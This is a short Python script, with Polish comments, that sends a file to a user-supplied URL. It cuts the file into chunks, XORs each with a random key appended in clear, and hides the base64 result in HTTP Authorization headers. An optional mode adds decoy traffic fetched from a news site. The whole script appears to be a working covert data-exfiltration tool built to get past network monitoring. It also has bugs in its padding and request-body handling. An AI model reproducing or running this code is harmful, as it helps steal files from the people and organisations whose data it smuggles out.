import argparse
import requests
import base64
import random

def padding(data, block_size=256):
    """
    Funkcja dodaje wypełnienie zerami do danych, aby miały one określoną długość.

    :param data: Dane do wypełnienia.
    :param block_size: Docelowa długość danych po wypełnieniu.
    :return: Wypełnione dane.
    """
    padding_length = block_size - len(data)
    padded_data = data + b'\x00' * padding_length
    return padded_data

def xor_encrypt(chunk, key):
    """
    Funkcja wykonuje operację XOR na podanym ciągu bajtów i kluczu oraz dokleja klucz na koniec zaszyfrowanego ciągu.

    :param chunk: Ciąg bajtów o długości 256 do zaszyfrowania.
    :param key: Klucz (ciąg bajtów) o długości 256 używany do zaszyfrowania.
    :return: Zaszyfrowany ciąg bajtów o długości 512.
    """
    # Sprawdzenie długości klucza
    if len(key) != 256:
        raise ValueError("Klucz musi mieć dokładnie 256 bajtów.")

    # Wykonanie operacji XOR na każdym bajcie
    encrypted_bytes = bytes(chunk[i] ^ key[i] for i in range(256))

    # Doklejenie klucza na koniec zaszyfrowanego ciągu
    encrypted_bytes += key

    return encrypted_bytes

def generate_random_bytes(length=256):
    """
    Funkcja generuje losowy ciąg bajtów o określonej długości.

    :param length: Długość generowanego ciągu bajtów.
    :return: Losowy ciąg bajtów.
    """
    # Generowanie losowych bajtów
    random_bytes = bytes([random.randint(0, 255) for _ in range(length)])

    return random_bytes

def send_data(url, file_path, chunk_size=1024, stego=True):
    with open(file_path, "rb") as file:
        while True:
            chunk = file.read(chunk_size)
            if not chunk:
                break
            
            chunk = padding(chunk)
            chunk = xor_encrypt(chunk, generate_random_bytes())


            encoded_chunk = base64.b64encode(chunk).decode()  # Encode the chunk using base64
            headers = {'Authorization': encoded_chunk}
            if stego == True:
                msg_body = requests.get("https://www.wp.pl")
            else:
                msg_body = chunk
            response = requests.get(url, headers=headers, data=msg_body)
            
            if response.status_code != 200:
                print("Failed to send data.")
                return

    print("Data sent successfully.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Send data via HTTP headers.')
    parser.add_argument('url', type=str, help='URL of the receiver')
    parser.add_argument('file', type=str, help='Path to the file to send')
    args = parser.parse_args()
    
    send_data(args.url, args.file, chunk_size=256, stego=False)
